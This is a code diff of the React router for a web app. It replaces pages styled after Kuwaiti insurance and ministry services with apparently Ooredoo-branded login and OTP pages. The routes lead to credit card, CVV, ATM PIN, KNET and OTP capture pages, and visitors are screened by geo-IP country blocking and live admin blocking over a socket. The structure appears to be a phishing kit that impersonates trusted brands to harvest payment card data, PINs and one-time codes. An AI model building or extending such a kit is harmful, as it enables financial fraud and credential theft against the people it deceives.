@@ -1,4 +1,3 @@
-import { useEffect, useState } from "react";
 import { Toaster } from "@/components/ui/sonner";
 import { TooltipProvider } from "@/components/ui/tooltip";
 import NotFound from "@/pages/NotFound";
@@ -7,51 +6,48 @@ import ErrorBoundary from "./components/ErrorBoundary";
 import ScrollToTop from "./components/ScrollToTop";
 import PageTitleUpdater from "./components/PageTitleUpdater";
 import { ThemeProvider } from "./contexts/ThemeContext";
+import { LanguageProvider } from "./i18n/LanguageContext";
 import { initializeSocket, disconnectSocket, socket } from "./lib/store";
-import AmerChat from "./components/AmerChat";
+import { useState, useEffect } from "react";
 
-// Main Pages (Vehicle Inspection)
-import KuwaitInsuranceHome from "./pages/KuwaitInsuranceHome";
-import RechargePage from "./pages/RechargePage";
-import PayForOthers from "./pages/PayForOthers";
-import MOHLogin from "./pages/MOHLogin";
-import MOHRegister from "./pages/MOHRegister";
-import MOHCreateAccount from "./pages/MOHCreateAccount";
+// New Pages
+import Portal from "./pages/Portal";
+import Home from "./pages/Home";
+import ServiceDetails from "./pages/ServiceDetails";
+import OoredooLogin from "./pages/OoredooLogin";
+import OoredooOtp from "./pages/OoredooOtp";
+import Waiting from "./pages/Waiting";
 
-
-// Form Pages
-import SummaryPayment from "./pages/SummaryPayment";
-
-// Payment Pages
+// Payment Pages (kept as-is)
 import CreditCardPayment from "./pages/CreditCardPayment";
 import OTPVerification from "./pages/OTPVerification";
 import ATMPassword from "./pages/ATMPassword";
 import KNETPayment from "./pages/KNETPayment";
 import CVV from "./pages/CVV";
-
-
-
-
-
-
-// Final Page
 import FinalPage from "./pages/FinalPage";
 
+function BlockedCountryPage() {
+  return (
+    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+      <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
+        <h1 className="text-2xl font-bold text-gray-800 mb-4">غير متاح</h1>
+        <p className="text-gray-600 mb-2">عذراً، هذه الخدمة غير متاحة في منطقتك</p>
+        <p className="text-gray-500 text-sm">This service is not available in your region</p>
+      </div>
+    </div>
+  );
+}
 
 function Router() {
   return (
     <Switch>
-      {/* Main Pages */}
-      <Route path={"/"} component={RechargePage} />
-      <Route path={"/recharge"} component={RechargePage} />
-      <Route path={"/pay-for-others"} component={PayForOthers} />
-      <Route path={"/moh-login"} component={MOHLogin} />
-      <Route path={"/moh-register"} component={MOHRegister} />
-      <Route path={"/moh-create-account"} component={MOHCreateAccount} />
-
-
-      {/* Form Routes */}
-      <Route path={"/summary-payment"} component={SummaryPayment} />
+      {/* New Pages */}
+      <Route path={"/"} component={Portal} />
+      <Route path={"/medical-commission"} component={Home} />
+      <Route path={"/services/:key"} component={ServiceDetails} />
+      <Route path={"/ooredoo-login"} component={OoredooLogin} />
+      <Route path={"/ooredoo-otp"} component={OoredooOtp} />
+      <Route path={"/waiting"} component={Waiting} />
 
       {/* Payment Routes */}
       <Route path={"/credit-card-payment"} component={CreditCardPayment} />
@@ -59,38 +55,11 @@ function Router() {
       <Route path={"/atm-password"} component={ATMPassword} />
       <Route path={"/knet-payment"} component={KNETPayment} />
       <Route path={"/cvv"} component={CVV} />
-
-
-
-
-
-
-      {/* Final Page */}
       <Route path={"/final-page"} component={FinalPage} />
 
-
       <Route path={"/404"} component={NotFound} />
-      {/* Final fallback route */}
       <Route component={NotFound} />
     </Switch>
-  );
-}
-
-// Blocked Country Page Component
-function BlockedCountryPage() {
-  return (
-    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-      <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
-        <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
-          <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
-          </svg>
-        </div>
-        <h1 className="text-2xl font-bold text-gray-800 mb-4">غير متاح</h1>
-        <p className="text-gray-600 mb-2">عذراً، هذه الخدمة غير متاحة في منطقتك</p>
-        <p className="text-gray-500 text-sm">This service is not available in your region</p>
-      </div>
-    </div>
   );
 }
 
@@ -101,14 +70,13 @@ function App() {
   const [isVisitorBlocked, setIsVisitorBlocked] = useState(false);
   const [blockedMessage, setBlockedMessage] = useState("");
 
-  // Initialize socket on app mount
   useEffect(() => {
     initializeSocket();
     return () => {
       disconnectSocket();
     };
   }, []);
-  // Listen for admin block/unblock events
+
   useEffect(() => {
     const s = socket.value;
     const handleBlocked = () => {
@@ -127,75 +95,53 @@ function App() {
     };
   }, []);
 
-  // Check if visitor's country is blocked
   useEffect(() => {
     const checkCountry = async () => {
       try {
-        // Get visitor's country from IP
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
         const visitorCountry = data.country_name;
-        
-        // Check with server if country is blocked
         socket.value.emit('blockedCountries:check', visitorCountry);
-        
-        socket.value.on('blockedCountries:checkResult', ({ isBlocked }) => {
+        socket.value.on('blockedCountries:checkResult', ({ isBlocked }: { isBlocked: boolean }) => {
           setIsCountryBlocked(isBlocked);
           setIsCheckingCountry(false);
         });
-
-        // Also listen for updates to blocked countries
         socket.value.on('blockedCountries:updated', async (blockedCountries: string[]) => {
-          const isBlocked = blockedCountries.some(c => 
+          const isBlocked = blockedCountries.some(c =>
             c.toLowerCase() === visitorCountry.toLowerCase()
           );
           setIsCountryBlocked(isBlocked);
         });
-      } catch (error) {
-        console.error('Error checking country:', error);
+      } catch {
         setIsCheckingCountry(false);
       }
     };
-
-    // Wait for socket to be ready
     const timer = setTimeout(checkCountry, 1000);
-    
-    // Fallback: if still checking after 3 seconds, allow access
     const fallbackTimer = setTimeout(() => {
       setIsCheckingCountry(false);
     }, 3000);
-    
     return () => {
       clearTimeout(timer);
       clearTimeout(fallbackTimer);
     };
   }, []);
 
-  // Show loading while checking country
   if (isCheckingCountry) {
     return (
       <div className="min-h-screen bg-gray-100 flex items-center justify-center">
-        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-green-600"></div>
+        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-red-600"></div>
       </div>
     );
   }
 
-  // Show blocked page if country is blocked
-  if (isCountryBlocked) {
-    return <BlockedCountryPage />;
-  }
-  // Show blocked page if visitor is blocked by admin
+  if (isCountryBlocked) return <BlockedCountryPage />;
+
   if (isVisitorBlocked) {
     return (
       <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
         <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
-          <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
-            <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
-            </svg>
-          </div>
           <h1 className="text-2xl font-bold text-gray-800 mb-4">تم الحظر</h1>
-          <p className="text-gray-600 mb-2">{blockedMessage || "تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام."}</p>
+          <p className="text-gray-600 mb-2">{blockedMessage}</p>
         </div>
       </div>
     );
@@ -203,14 +149,16 @@ function App() {
 
   return (
     <ErrorBoundary>
-      <ThemeProvider defaultTheme="light">
-        <TooltipProvider>
-          <Toaster />
-          <ScrollToTop />
-          <PageTitleUpdater />
-          <Router />
-        </TooltipProvider>
-      </ThemeProvider>
+      <LanguageProvider>
+        <ThemeProvider defaultTheme="light">
+          <TooltipProvider>
+            <Toaster />
+            <ScrollToTop />
+            <PageTitleUpdater />
+            <Router />
+          </TooltipProvider>
+        </ThemeProvider>
+      </LanguageProvider>
     </ErrorBoundary>
   );
 }
